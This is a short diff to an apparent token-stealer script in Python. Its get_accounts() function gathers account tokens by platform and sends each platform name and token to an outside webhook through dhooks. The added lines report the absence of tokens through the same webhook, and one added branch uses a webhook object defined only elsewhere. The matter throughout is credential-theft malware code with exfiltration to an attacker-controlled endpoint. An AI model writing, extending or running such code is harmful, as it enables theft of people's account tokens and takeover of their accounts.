@@ -45,6 +45,9 @@ def get_accounts():
                 # Sends the info through the webhook
                 wb = dhooks.Webhook(WEBHOOK_URL)
                 wb.send(f"Platform: {platform}\tToken: {token}")
-
-
+        elif len(tokens) == 0:
+            wb.send(f"No token exists!")
+            print("There is no token!")
+        else:
+            print("No Token Found!")
 get_accounts()
